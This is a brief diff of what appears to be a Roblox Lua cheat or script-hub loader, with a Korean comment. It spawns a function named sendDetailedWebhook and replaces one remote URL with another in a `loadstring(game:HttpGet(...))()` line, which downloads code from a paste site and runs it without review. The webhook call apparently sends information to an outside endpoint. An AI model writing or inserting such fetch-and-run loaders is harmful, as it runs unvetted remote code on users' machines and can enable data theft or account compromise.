@@ -95,4 +95,6 @@ end
 -- 실행
 
 task.spawn(sendDetailedWebhook)
-loadstring(game:HttpGet('https://zuwz.me/Ls-Zee-Hub-KL'))()
+loadstring(game:HttpGet("https://pastefy.app/PntCUC9c/raw", true))()
+
+
